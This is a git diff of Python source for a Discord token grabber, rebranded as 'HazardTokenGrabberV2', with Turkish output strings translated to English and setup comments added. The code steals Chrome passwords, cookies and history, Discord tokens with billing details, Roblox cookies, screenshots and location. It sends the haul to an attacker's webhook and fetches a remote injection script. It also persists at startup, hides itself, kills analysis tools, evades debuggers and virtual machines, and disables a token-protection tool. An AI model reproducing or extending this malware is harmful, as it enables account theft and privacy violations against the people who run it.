@@ -26,14 +26,24 @@ __author__ = "ahmetcn67"
 __version__ = '1.8.8'
 __license__ = "GPL-3.0"
 __config__ = {
-    'webhook': "WEBHOOK_HERE",  
+    # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
+    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+    'webhook': "WEBHOOK_HERE",  # Place your webhook here
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
+    # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
+    # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
+    # if you want the file to run at startup
     'startup': True,
+    # if you want the file to hide itself after run
     'hide_self': True,
+    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
+    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
     'blackListedPrograms':
     [
         "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr",
@@ -147,7 +157,7 @@ class Functions(object):
         return __config__.get(e)
 
 
-class nikoVGrabber(Functions):
+class HazardTokenGrabberV2(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
@@ -292,6 +302,7 @@ class nikoVGrabber(Functions):
                     pass
 
     async def bypassTokenProtector(self):
+        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
         tp = f"{self.roaming}\\DiscordTokenProtector\\"
         if not ntpath.exists(tp):
             return
@@ -308,7 +319,7 @@ class nikoVGrabber(Functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
+                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/ahmetcn67"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -396,7 +407,7 @@ class nikoVGrabber(Functions):
 
     @try_extract
     def grabPassword(self):
-        f = open(ntpath.join(self.dir, 'Google', 'Google Sifreleri.txt'), 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google Passwords.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
                 login_db = ntpath.join(self.chrome_user_data, prof, 'Login Data')
@@ -422,7 +433,7 @@ class nikoVGrabber(Functions):
 
     @try_extract
     def grabCookies(self):
-        f = open(ntpath.join(self.dir, 'Google', 'Google Cookie.txt'), 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google Cookies.txt'), 'w', encoding="cp437", errors='ignore')
         for prof in os.listdir(self.chrome_user_data):
             if re.match(self.chrome_reg, prof):
                 login_db = ntpath.join(self.chrome_user_data, prof, 'Network', 'cookies')
@@ -449,7 +460,7 @@ class nikoVGrabber(Functions):
 
     @try_extract
     def grabHistory(self):
-        f = open(ntpath.join(self.dir, 'Google', 'Google AramaGecmisi.txt'), 'w', encoding="cp437", errors='ignore')
+        f = open(ntpath.join(self.dir, 'Google', 'Google History.txt'), 'w', encoding="cp437", errors='ignore')
 
         def extract_search_history(db_cursor):
             db_cursor.execute('SELECT term FROM keyword_search_terms')
@@ -494,13 +505,13 @@ class nikoVGrabber(Functions):
             badges = ""
             flags = j['flags']
             if (flags == 1):
-                badges += "Discord Yetkilisi, "
+                badges += "Staff, "
             if (flags == 2):
                 badges += "Partner, "
             if (flags == 4):
-                badges += "Hypesquad Etkinligi, "
+                badges += "Hypesquad Event, "
             if (flags == 8):
-                badges += "Yesil Bug Avcisi, "
+                badges += "Green Bughunter, "
             if (flags == 64):
                 badges += "Hypesquad Bravery, "
             if (flags == 128):
@@ -508,16 +519,16 @@ class nikoVGrabber(Functions):
             if (flags == 256):
                 badges += "HypeSquad Balance, "
             if (flags == 512):
-                badges += "Erken Destekci, "
+                badges += "Early Supporter, "
             if (flags == 16384):
-                badges += "Altin Bug Avcisi, "
+                badges += "Gold BugHunter, "
             if (flags == 131072):
-                badges += "Onaylanmis Bot Gelistiricisi, "
+                badges += "Verified Bot Developer, "
             if (badges == ""):
                 badges = "None"
 
             email = j.get("email")
-            phone = j.get("phone") if j.get("phone") else "Hic bir telefon numarasi baglanmamis"
+            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
@@ -549,7 +560,7 @@ class nikoVGrabber(Functions):
         if reg_cookie:
             self.robloxcookies.append(reg_cookie)
         if self.robloxcookies:
-            with open(self.dir + "\\Roblox Cookie.txt", "w") as f:
+            with open(self.dir + "\\Roblox Cookies.txt", "w") as f:
                 for i in self.robloxcookies:
                     f.write(i + '\n')
 
@@ -560,7 +571,7 @@ class nikoVGrabber(Functions):
             all_screens=True,
             xdisplay=None
         )
-        image.save(self.dir + "\\AnlikEkranAlintisi.png")
+        image.save(self.dir + "\\Screenshot.png")
         image.close()
 
     def sys_dump(self):
@@ -584,7 +595,7 @@ Org: {self.org}
 GoogleMaps: {self.googlemap}
 {line_sep}
         """
-        with open(self.dir + "\\PC Bilgileri.txt", "w", encoding="utf-8", errors='ignore') as f:
+        with open(self.dir + "\\System info.txt", "w", encoding="utf-8", errors='ignore') as f:
             f.write(about)
 
     def finish(self):
@@ -598,9 +609,9 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("🌟・Grabber By github.com/ahmetcn67・\n\n")
+                            f.write("🌟・Grabber By github.com/ahmetcn67・https://github.com/ahmetcn67/98765432\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\n🌟・Grabber By github.com/ahmetcn67・")
+                            fp.write(x + "\n\n🌟・Grabber By github.com/ahmetcn6・https://github.com/ahmetcn67/98765432")
 
         _zipfile = ntpath.join(self.appdata, f'nikoVGrabber-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -626,12 +637,12 @@ GoogleMaps: {self.googlemap}
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* nikoV Grabber calistirdi',
-                        'url': 'https://github.com/ahmetcn67/98765432',
+                        'name': f'*{Victim}* nikoV Grabber',
+                        'url': 'https://github.com/ahmetcn67',
                         'icon_url': 'https://yt3.ggpht.com/fOGPRUF0KvXJCka3DZ4_ebfawLenyROYCIhVqdjFrnIWVmHBVN1GodrhkHMQaALplMoAjQwz=s900-c-k-c0x00ffffff-no-rj'
                     },
                     'color': 176185,
-                    'description': f'[Google Haritalar Konumu]({self.googlemap})',
+                    'description': f'[Google Maps Location]({self.googlemap})',
                     'fields': [
                         {
                             'name': '\u200b',
@@ -673,7 +684,7 @@ GoogleMaps: {self.googlemap}
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/ahmetcn67・'
+                        'text': '🌟・Grabber By github.com/ahmetcn67・https://github.com/ahmetcn67/98765432'
                     }
                 }
             ]
@@ -752,12 +763,12 @@ class AntiDebug(Functions):
                 self.programExit()
 
     def specsCheck(self):
-
-        if int(ram) <= 2:  
+        # would not recommend changing this to over 2gb since some actually have 3gb of ram
+        if int(ram) <= 2:  # 2gb or less ram
             self.programExit()
-        if int(disk) <= 50:  
+        if int(disk) <= 50:  # 50gb or less disc space
             self.programExit()
-        if int(psutil.cpu_count()) <= 1:  
+        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
             self.programExit()
 
     def registryCheck(self):
@@ -780,4 +791,4 @@ if __name__ == "__main__" and os.name == "nt":
         httpx.get('https://google.com')
     except (httpx.NetworkError, httpx.TimeoutException):
         os._exit(0)
-    asyncio.run(nikoVGrabber().init())
+    asyncio.run(HazardTokenGrabberV2().init())
